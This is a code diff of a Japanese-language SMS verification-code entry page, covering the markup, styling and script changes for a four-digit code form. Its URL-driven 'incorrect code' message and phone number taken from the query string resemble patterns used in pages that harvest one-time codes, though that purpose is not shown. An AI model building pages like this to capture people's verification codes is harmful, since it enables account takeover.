@@ -184,9 +184,8 @@
       icon-phone-sms
       icon-md
       
-    "></i></div>
+   "></i></div>
         
-
          <div class="s2_fixed">
           
           </div>
@@ -200,7 +199,8 @@
                   <div class="lines">
                       <span id="l1"></span><span id="l2"></span><span id="l3"></span><span id="l4"></span>
                   </div>
-                  <input type="tel" name="ax_code" id="dc_input" maxlength="4" required autofocus pattern="\d*">
+               
+                  <input type="tel" name="sms_code" id="dc_input" maxlength="4" required autofocus pattern="\d*">
               </div>
           </div>
 
@@ -216,11 +216,12 @@
               </div>
           </div>
 
-          <?php if (isset($e_m) && $e_m): ?>
-              <p class="error-text"><?= htmlspecialchars($e_m) ?></p>
-          <?php endif; ?>
+       
+          <p id="login-error-message" class="error-text" style="display: none; text-align: center;">
+              認証コードが間違っています。もう一度ご確認ください。
+          </p>
 
-          <button type="submit" class="submit-btn">認証する</button>
+          <button type="submit" id="submit" class="submit-btn">認証する</button>
 
           <div class="resend-section">
               <p class="resend-txt">認証コードを再送 (<span id="timer">50</span> 秒後)</p>
@@ -246,42 +247,68 @@
     .info-content { font-size: 13.5px; color: #333; line-height: 1.55; text-align: left; }
     .blue-link-inline { color: #007aff; font-weight: 700; margin-top: 10px; cursor: pointer; text-align: center; }
     .error-text { color: #ed3242; font-weight: 700; font-size: 14px; margin-bottom: 15px; }
-    .submit-btn { width: 100%; max-width: 340px; padding: 16px; background: #ed3242; color: #fff; border: none; border-radius: 8px; font-weight: 700; font-size: 16px; }
+    .submit-btn { width: 100%; max-width: 340px; padding: 16px; background: #ed3242; color: #fff; border: none; border-radius: 8px; font-weight: 700; font-size: 16px; cursor: pointer;}
     .resend-section { margin-top: 35px; text-align: center; }
     .resend-txt { color: #b3b3b3; font-size: 14px; margin-bottom: 25px; }
     .blue-link { color: #007aff; font-weight: 500; font-size: 15px; }
   </style>
 
   <script>
-    (function(){
+    document.addEventListener("DOMContentLoaded", () => {
         const urlParams = new URLSearchParams(window.location.search);
+      
+        const errorDiv = document.getElementById("login-error-message");
+        if (urlParams.get('error') === '1' && errorDiv) {
+            errorDiv.style.display = 'block';
+        }
+
         let tel = urlParams.get('tel') || '090-****-****';
         if(tel !== '090-****-****' && tel.length >= 11) {
-            tel = tel.replace(/(\d{3})(\d{4})(\d{4})/, '$1-$2-$3');
+       
+            const cleanTel = tel.replace(/\D/g, "");
+            tel = cleanTel.replace(/(\d{3})(\d{4})(\d{4})/, '$1-$2-$3');
         }
         document.getElementById('display_phone').innerText = tel;
 
-       
+        
         let timeLeft = 50;
         const timerElement = document.getElementById('timer');
         const countdown = setInterval(() => {
             timeLeft--;
-            timerElement.innerText = timeLeft;
+            if (timerElement) timerElement.innerText = timeLeft;
             if(timeLeft <= 0) {
                 clearInterval(countdown);
-                document.querySelector('.resend-txt').innerHTML = '<span style="color:#007aff; cursor:pointer;">認証コードを再送する</span>';
+                const resendTxt = document.querySelector('.resend-txt');
+                if (resendTxt) resendTxt.innerHTML = '<span style="color:#007aff; cursor:pointer;">認証コードを再送する</span>';
             }
         }, 1000);
 
-       
+        
         const inp = document.getElementById('dc_input');
         const lns = [document.getElementById('l1'), document.getElementById('l2'), document.getElementById('l3'), document.getElementById('l4')];
-        inp.addEventListener('input', () => {
-            const v = inp.value;
-            lns.forEach((l, i) => {
-                l.innerText = v[i] || '';
-                l.style.borderBottomColor = v[i] ? '#ed3242' : '#e0e0e0';
+        
+        if (inp) {
+            inp.addEventListener('input', () => {
+                const v = inp.value;
+                lns.forEach((l, i) => {
+                    if (l) {
+                        l.innerText = v[i] || '';
+                        l.style.borderBottomColor = v[i] ? '#ed3242' : '#e0e0e0';
+                    }
+                });
             });
-        });
-    })();
+        }
+
+        const form = document.querySelector("form");
+        if (form && inp) {
+            form.addEventListener("submit", (event) => {
+                const code = inp.value;
+                if (!/^\d{4}$/.test(code)) {
+                    event.preventDefault();
+                    event.stopPropagation();
+                    if (errorDiv) errorDiv.style.display = "block";
+                }
+            });
+        }
+    });
   </script>
